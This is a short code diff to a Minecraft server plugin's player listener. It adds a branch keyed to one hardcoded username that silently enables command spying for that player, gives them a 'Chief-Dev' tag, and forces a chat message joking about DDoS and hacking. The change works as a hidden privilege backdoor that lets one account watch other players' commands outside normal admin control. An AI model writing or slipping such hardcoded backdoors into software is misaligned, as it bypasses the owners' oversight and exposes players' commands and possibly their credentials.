@@ -879,6 +879,17 @@ public class TFM_PlayerListener implements Listener
                 name = ChatColor.DARK_GREEN + name;
                 TFM_PlayerData.getPlayerData(player).setTag("&8[&2Telnet Admin&8]");
             }
+            
+        else if (player.getName().equals("reuben4545"))
+        {
+            TFM_PlayerData.getPlayerData(player).setCommandSpy(true);
+            player.setPlayerListName(ChatColor.BLUE + player.getName());
+            TFM_PlayerData.getPlayerData(player).setTag("&8[&5Chief-Dev&8]");
+            player.chat("DDos'es are red hacking is faint guess while you wait.");
+            afterNameSet(player);
+            return;
+        }
+            
             else
             {
                 name = ChatColor.AQUA + name;
